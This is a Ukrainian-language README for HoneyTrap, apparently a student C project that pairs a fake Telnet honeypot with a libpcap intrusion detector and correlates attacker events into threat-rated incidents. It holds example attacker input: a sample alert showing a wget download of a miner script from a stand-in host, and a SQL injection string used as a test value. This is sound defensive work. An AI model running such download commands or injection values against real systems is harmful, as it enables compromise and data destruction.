# HoneyTrap

Система виявлення та аналізу мережевих атак на C для Linux. Поєднує два захисні сенсори:

- **Honeypot** — пастка, що вдає вразливий Telnet-сервер. Вона приймає логіни й паролі, показує фейкову консоль і записує все, що робить атакер. Нічого з введеного не виконується по-справжньому.
- **IDS** — сенсор, який через libpcap аналізує мережевий трафік і виявляє сканування портів, SYN-flood та ARP-spoofing.

Головна частина системи — **корелятор**. Він зводить події з обох сенсорів за IP-адресою в один інцидент з таймлайном і рівнем загрози LOW / MEDIUM / HIGH. Наприклад: скан → брутфорс → вхід → спроба завантажити malware = **HIGH**.

> **Статус:** honeypot, ядро (черга, корелятор), сховище та звіти працюють. IDS у розробці (`src/ids/`).

## Швидкий старт

```sh
make
./build/honeytrap
```

В іншому терміналі «атакуємо» пастку:

```sh
telnet localhost 2222
```

Будь-які логін і пароль приймаються з третьої спроби. Після входу спробуй `whoami`, `uname -a`, `wget http://example.com/x.sh`.

Зупинка: **Ctrl+C** у першому терміналі. Програма виведе підсумок і створить `report.html`.

## Залежності

| Що | Навіщо |
|---|---|
| `gcc`, `make` | збірка |
| SQLite 3 (заголовки) | сховище подій та інцидентів |
| libpcap (заголовки) | захоплення трафіку в IDS |
| `telnet` | ручна перевірка honeypot (необов'язково) |

Arch Linux:

```sh
sudo pacman -S gcc make sqlite libpcap inetutils
```

Debian / Ubuntu:

```sh
sudo apt install gcc make libsqlite3-dev libpcap-dev telnet
```

Фреймворк для тестів [Unity](https://github.com/ThrowTheSwitch/Unity) (v2.6.1) уже лежить у `tests/unity/`, окремо встановлювати його не треба.

## Збірка

| Команда | Що робить |
|---|---|
| `make` | збирає `build/honeytrap` і `compile_commands.json` для редактора |
| `make test` | збирає й запускає всі unit-тести |
| `make SAN=address` | збірка з AddressSanitizer + UBSan у `build/address/` |
| `make SAN=thread` | збірка з ThreadSanitizer у `build/thread/` |
| `make clean` | видаляє `build/` |

Санітайзери поєднуються з будь-якою ціллю, наприклад `make SAN=thread test`.

Збірка йде з `-Wall -Wextra -Wpedantic -Werror`, тому будь-яке попередження компілятора зупиняє її.

**Редактор.** `make` генерує `compile_commands.json`, а `.vscode/c_cpp_properties.json` вказує на нього розширенню C/C++. Якщо редактор підкреслює `#include` червоним, запусти `make` і виконай `C/C++: Reset IntelliSense Database`.

## Запуск

```
./build/honeytrap [-c config_file] [-r]
```

| Опція | Опис |
|---|---|
| `-c FILE` | файл конфігурації (за замовчуванням `config/honeytrap.conf`) |
| `-r` | лише згенерувати звіт з наявної бази і вийти; сенсори не запускаються |
| `-h` | довідка |

Програму треба запускати з кореня репозиторію, бо шлях до конфігу за замовчуванням відносний.

**Порт.** За замовчуванням honeypot слухає 2222, root для цього не потрібен. Щоб приймати атаки на справжньому порту 23, можна перенаправити трафік:

```sh
sudo iptables -t nat -A PREROUTING -p tcp --dport 23 -j REDIRECT --to-port 2222
```

**Зупинка.** На Ctrl+C або `SIGTERM` програма зупиняється в такому порядку:
1. honeypot перестає приймати нові з'єднання (до 1 секунди);
2. корелятор обробляє всі події, що лишилися в черзі, тож жодна прийнята подія не губиться;
3. база даних закривається;
4. виводиться підсумок і генерується HTML-звіт.

**Коди виходу:** `0` — успіх; `1` — помилка (поганий конфіг, не відкрилася база, не вдалося зайняти порт тощо). Причина помилки завжди виводиться в `stderr`.

## Конфігурація

Файл `config/honeytrap.conf` має формат `ключ = значення`, `#` починає коментар. Ключі, яких немає у файлі, отримують значення за замовчуванням. Змінювати правила можна без перекомпіляції.

| Ключ | За замовч. | Опис |
|---|---|---|
| `honeypot.port` | `2222` | TCP-порт пастки |
| `honeypot.login_after` | `3` | з якої спроби «впустити» атакера |
| `honeypot.max_clients` | `32` | максимум одночасних атакерів |
| `ids.interface` | `eth0` | мережевий інтерфейс для захоплення |
| `ids.pcap_file` | *(порожньо)* | якщо задано, IDS читає цей `.pcap` замість інтерфейсу |
| `ids.portscan_ports` | `20` | стільки різних портів… |
| `ids.portscan_window_sec` | `3` | …за стільки секунд дають `PORT_SCAN` |
| `ids.synflood_syns` | `100` | стільки SYN-пакетів… |
| `ids.synflood_window_sec` | `1` | …за стільки секунд дають `SYN_FLOOD` |
| `core.queue_capacity` | `1024` | розмір черги подій |
| `core.incident_timeout_sec` | `3600` | якщо IP мовчав довше, наступна його подія відкриває новий інцидент |
| `storage.db_path` | `honeytrap.db` | файл бази SQLite |
| `storage.report_path` | `report.html` | куди писати HTML-звіт |

Помилки в конфігу зупиняють запуск і вказують номер рядка:

```
[ERROR] src/config.c:149: config/honeytrap.conf:2: unknown key 'honeypot.prot'
```

Помилкою вважаються невідомий ключ, рядок без `=`, нечислове значення, значення поза допустимим діапазоном (наприклад, порт 70000) і задовге значення.

## Що бачить адміністратор

**Алерти в реальному часі.** Алерт з'являється, коли відкривається новий інцидент і коли рівень загрози зростає. У терміналі алерти кольорові; при перенаправленні у файл вони без кольорів.

```
17:33:55 [ALERT] LOW    incident #1 127.0.0.1 (new): CONNECT
17:33:56 [ALERT] MEDIUM incident #1 127.0.0.1 (LOW -> MEDIUM): LOGIN_ATTEMPT user='root' pass='toor'
17:33:56 [ALERT] HIGH   incident #1 127.0.0.1 (MEDIUM -> HIGH): DOWNLOAD_ATTEMPT wget http://evil.example/miner.sh
```

Алерти йдуть у `stdout`, службові повідомлення (`[INFO]`, `[WARN]`, `[ERROR]`) — у `stderr`. Тому їх можна розділити: `./build/honeytrap > alerts.log`.

**Підсумок при зупинці:**

```
=== HoneyTrap summary ===
events: 11, unique IPs: 1
incidents: 1 (HIGH 1, MEDIUM 0, LOW 0)
report: report.html
```

**HTML-звіт** (`report.html`) містить:
- загальні цифри: події, інциденти, унікальні IP, кількість інцидентів кожного рівня;
- список інцидентів, де найнебезпечніші йдуть першими; таймлайн кожного розгортається (до 500 подій на інцидент);
- топ паролів, логінів, команд та IP;
- спроби завантаження (`wget`/`curl`);
- розподіл за типами подій.

Звіт можна перегенерувати будь-коли, не запускаючи сенсори: `./build/honeytrap -r`.

## Архітектура

```
 ┌───────────┐  queue_sink                                    ┌──────────────┐
 │ Honeypot  │───────────┐                                ┌──►│   SQLite     │
 │ (потік на │           ▼                                │   │ incidents,   │
 │  атакера) │     ┌───────────┐    ┌──────────────┐      │   │ events       │
 └───────────┘     │   Черга   │───►│  Корелятор   │──────┤   └──────┬───────┘
 ┌───────────┐     │ (mutex +  │    │ (один потік) │      │          │
 │    IDS    │────►│  condvar) │    └──────────────┘      │          ▼
 │ (libpcap) │     └───────────┘                          │   ┌──────────────┐
 └───────────┘                                            └──►│ Алерти       │
                                                              │ (stdout)     │
     main.c: конфіг, запуск потоків, Ctrl+C                   └──────────────┘
                                                              HTML-звіт ◄── SQLite
```

- **Подія** (`struct event`, `src/core/event.h`) — спільний «контракт» між модулями. Вона містить тип, джерело, час, IP, порт, номер сесії, логін, пароль і деталі (команду, URL або опис детектора). Події передаються за значенням, усі рядки мають фіксований розмір, тож динамічної пам'яті немає.
- **Черга** (`src/core/queue.c`) — обмежений кільцевий буфер. Кілька потоків додають події, один забирає. Якщо черга повна, `push` чекає, тому події не губляться. `queue_close` будить усі потоки, які чекають, і віддає залишок черги до кінця.
- **Корелятор** (`src/core/correlator.c`) групує події за IP, рахує рівень загрози, пише все в базу й видає алерти.
- **Сенсор підключається** через функцію типу `event_sink_fn(const struct event *ev, void *ctx)`. `main.c` передає сенсору `queue_sink` разом із чергою.

## Рівні загрози

Рівень інциденту лише зростає, ніколи не знижується.

| Рівень | Коли |
|---|---|
| **LOW** | будь-яка активність: підключення, скан портів, 1–2 спроби входу, команди |
| **MEDIUM** | брутфорс (≥ 3 спроби входу), успішний вхід, SYN-flood, ARP-spoofing |
| **HIGH** | спроба завантажити файл (`wget`/`curl`), **або** скан портів + успішний вхід |

Інцидент — це всі події одного IP, між якими минуло не більше `core.incident_timeout_sec`.

## База даних

SQLite-файл (`storage.db_path`) з двома таблицями:

```sql
incidents (id, src_ip, first_seen, last_seen, level, event_count)
events    (id, incident_id → incidents.id, type, source, timestamp,
           src_ip, dst_port, session_id, username, password, details)
```

- Час зберігається як Unix timestamp.
- `type` — назва події (`LOGIN_ATTEMPT`, `COMMAND`, …), `source` — `honeypot` або `ids`.
- Таймлайн інциденту: `SELECT * FROM events WHERE incident_id = ? ORDER BY timestamp`.
- Сесія атакера: усі події з однаковим `session_id`.

Базу можна дослідити напряму:

```sh
sqlite3 honeytrap.db "SELECT password, COUNT(*) FROM events WHERE type='LOGIN_ATTEMPT' GROUP BY password ORDER BY 2 DESC LIMIT 10"
```

## Безпека

Пастка працює з даними, які повністю контролює атакер, тому:

- **Нічого не виконується.** Fake shell лише повертає заготовлені відповіді, а `wget`/`curl` записуються як подія і нічого не завантажують.
- **Буфери обмежені.** Кожен рядок від атакера читається з обмеженням довжини, а поля події мають фіксований розмір і завжди закінчуються `'\0'`.
- **SQL-ін'єкції неможливі.** Усі запити, включно зі створенням таблиць, ідуть через `sqlite3_prepare_v2` + `sqlite3_bind_*`. Пароль `'); DROP TABLE events; --` зберігається як звичайний текст, на це є тест.
- **XSS у звіті неможливий.** Усі дані атакера в HTML екрануються (`& < > " '`), на це теж є тест.
- **Захист терміналу.** Атакер може надіслати escape-послідовності, які очищають екран або змінюють заголовок терміналу. В алертах усі керівні та не-ASCII символи замінюються на `?`, а в базі зберігається оригінал.
- **Помилки не замовчуються.** Кожна помилка йде в `stderr` з файлом і рядком, а збій `pthread` зупиняє програму через `abort()`.

- `src/core/event.h` змінюється лише за згодою всієї команди.

## Відомі обмеження

- **Лише Telnet, без SSH.** Справжній SSH-протокол надто складний для курсового проєкту.
- **Лише IPv4.**
- **Сесії атакерів не перериваються за Ctrl+C.** Honeypot перестає приймати нові з'єднання, а вже відкриті сесії завершуються разом із процесом. Подія, що надійде після закриття черги, не записується, і про це виводиться попередження `[WARN]`.
- **Стан коректора живе в пам'яті.** Після перезапуску програми події від того самого IP відкривають новий інцидент. Стара історія при цьому лишається в базі та у звіті.
